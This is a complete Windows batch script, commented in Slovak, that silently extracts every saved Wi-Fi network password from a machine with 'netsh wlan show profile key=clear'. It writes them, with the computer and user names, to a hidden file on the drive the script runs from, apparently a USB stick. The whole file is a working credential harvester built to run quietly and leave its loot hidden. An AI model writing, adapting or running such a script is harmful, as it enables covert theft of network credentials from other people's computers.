@echo off
setlocal enabledelayedexpansion

REM --- tichy, ziadne zbytocne echo/pause ---
REM timestamp
set "hr=%time:~0,2%"
if "%hr:~0,1%"==" " set "hr=0%hr:~1,1%"
set "min=%time:~3,2%"
set "sec=%time:~6,2%"
set "ts=%date:~6,4%%date:~3,2%%date:~0,2%_%hr%%min%%sec%"

set "pc=%computername%"
set "user=%username%"
set "drive=%~d0"

set "pretty=%drive%\WIFI_SSID_PASS_%pc%_%user%_%ts%.txt"
set "full=%drive%\WIFI_PROFILES_FULL_%pc%_%user%_%ts%.txt"
set "foundKeyContent=0"

REM -------- 1) RYCHLY MOD: SSID = heslo cez Key Content --------
> "%pretty%" echo === WIFI SSID = PASSWORD %ts% ===
>>"%pretty%" echo PC:%pc% USER:%user%
>>"%pretty%" echo.

for /f "tokens=1,* delims=:" %%A in ('netsh wlan show profiles ^| findstr ":"') do (
    set "name=%%B"
    set "name=!name:~1!"
    if not "!name!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('
            netsh wlan show profile name="!name!" key^=clear ^| findstr /I "Key Content"
        ') do (
            set "pwd=%%K"
        )
        if defined pwd (
            set "pwd=!pwd:~1!"
            >>"%pretty%" echo !name! = !pwd!
            set "foundKeyContent=1"
        )
    )
)

REM -------- 2) FALLBACK: ak sa nenasiel ANI JEDEN Key Content --------
if "%foundKeyContent%"=="0" (
    del "%pretty%" 2>nul

    > "%full%" echo ===== FULL WIFI PROFILE DUMP =====
    >>"%full%" echo PC:%pc%  USER:%user%  TIME:%ts%
    >>"%full%" echo.

    for /f "tokens=1,* delims=:" %%A in ('netsh wlan show profiles ^| findstr ":"') do (
        set "name=%%B"
        set "name=!name:~1!"
        if not "!name!"=="" (
            >>"%full%" echo ---------------------------------------------
            >>"%full%" echo PROFILE: !name!
            >>"%full%" echo ---------------------------------------------
            netsh wlan show profile name="!name!" key=clear>>"%full%" 2>&1
            >>"%full%" echo.
        )
    )
    attrib +h "%full%"
) else (
    attrib +h "%pretty%"
)

endlocal
exit /b
